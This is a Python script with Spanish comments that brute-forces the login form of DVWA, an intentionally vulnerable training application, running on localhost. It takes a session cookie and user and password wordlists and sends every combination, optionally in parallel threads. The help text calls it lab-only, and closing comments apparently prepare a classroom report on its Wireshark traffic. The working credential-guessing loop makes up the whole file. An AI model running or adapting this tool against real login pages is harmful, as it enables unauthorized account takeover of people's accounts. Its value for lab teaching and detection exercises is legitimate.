# dvwa_bruter.py
# Uso: python dvwa_bruter.py --sess TU_PHPSESSID --host 127.0.0.1 --port 8080 \
#       --users ~/Desktop/users.txt --passwords ~/Desktop/passwords.txt \
#       --concurrency 1 --delay 0.0
#
# Ejemplos:
#   Secuencial "suave":
#   python dvwa_bruter.py --sess 518sl6... --users ~/Desktop/users.txt --passwords ~/Desktop/passwords.txt
#
#   Paralelo (10 hilos) con 50 ms de pausa entre envíos:
#   python dvwa_bruter.py --sess 518sl6... --users ~/Desktop/users.txt --passwords ~/Desktop/passwords.txt \
#                         --concurrency 10 --delay 0.05

import argparse
import itertools
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


def load_list(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def make_session(sess_id: str):
    s = requests.Session()
    # DVWA usa estas cookies cuando Security=low
    s.cookies.set("PHPSESSID", sess_id, path="/")
    s.cookies.set("security", "low", path="/")
    # Cabeceras mínimas (útiles para distinguir de Burp en Wireshark)
    s.headers.update({
        "User-Agent": "python-requests",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    return s


def attempt(s: requests.Session, base_url: str, user: str, password: str, timeout: float = 5.0):
    """
    Retorna (user, password, status_code, ok, length)
    ok=True cuando la respuesta NO contiene 'incorrect'
    """
    data = {
        "username": user,
        "password": password,
        "Login": "Login",
    }
    try:
        r = s.post(f"{base_url}/vulnerabilities/brute/", data=data, timeout=timeout, allow_redirects=True)
        text = r.text if r.text is not None else ""
        ok = ("incorrect" not in text.lower())
        return (user, password, r.status_code, ok, len(text))
    except Exception as e:
        return (user, password, -1, False, 0)


def main():
    ap = argparse.ArgumentParser(description="DVWA brute generator (requests). Solo para laboratorio con permiso.")
    ap.add_argument("--sess", required=True, help="PHPSESSID del navegador (DVWA Security=low)")
    ap.add_argument("--host", default="127.0.0.1", help="Host de DVWA (default: 127.0.0.1)")
    ap.add_argument("--port", default="8080", help="Puerto de DVWA (default: 8080)")
    ap.add_argument("--users", required=True, help="Ruta a users.txt")
    ap.add_argument("--passwords", required=True, help="Ruta a passwords.txt")
    ap.add_argument("--concurrency", type=int, default=1, help="Número de hilos (1 = secuencial)")
    ap.add_argument("--delay", type=float, default=0.0, help="Pausa (seg) entre envíos por tarea (throttle)")
    ap.add_argument("--limit", type=int, default=0, help="Opcional: limitar total de intentos (0 = sin límite)")
    args = ap.parse_args()

    users = load_list(args.users)
    passwords = load_list(args.passwords)
    combos = itertools.product(users, passwords)

    if args.limit > 0:
        combos = itertools.islice(combos, args.limit)

    base_url = f"http://{args.host}:{args.port}"
    sess = make_session(args.sess)

    results = []
    t0 = time.time()

    if args.concurrency <= 1:
        # Modo secuencial
        for u, p in combos:
            res = attempt(sess, base_url, u, p)
            results.append(res)
            # Output compacto: user:pass -> code [OK/FAIL]
            print(f"{u}:{p} -> {res[2]} [{'OK' if res[3] else 'FAIL'}] len={res[4]}")
            if args.delay > 0:
                time.sleep(args.delay)
    else:
        # Modo concurrente (ThreadPoolExecutor)
        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
            futures = []
            for u, p in combos:
                futures.append(ex.submit(attempt, sess, base_url, u, p))
                if args.delay > 0:
                    time.sleep(args.delay)
            for fu in as_completed(futures):
                res = fu.result()
                results.append(res)
                print(f"{res[0]}:{res[1]} -> {res[2]} [{'OK' if res[3] else 'FAIL'}] len={res[4]}")

    dt = time.time() - t0
    total = len(results)
    oks = sum(1 for r in results if r[3])
    fails = total - oks

    print("\n=== Resumen ===")
    print(f"Intentos: {total}  |  OK: {oks}  |  FAIL: {fails}  |  Tiempo: {dt:.2f}s  |  Concurrency: {args.concurrency}")

    # Tip: Para tu informe, fíjate en Wireshark que:
    # - User-Agent es 'python-requests'
    # - Cabeceras mínimas (sin Accept-Language/Referer)
    # - Patrón de conexiones: depende de concurrency (más hilos => más streams)
    # - Cuerpo POST: application/x-www-form-urlencoded con username/password/Login


if __name__ == "__main__":
    main()
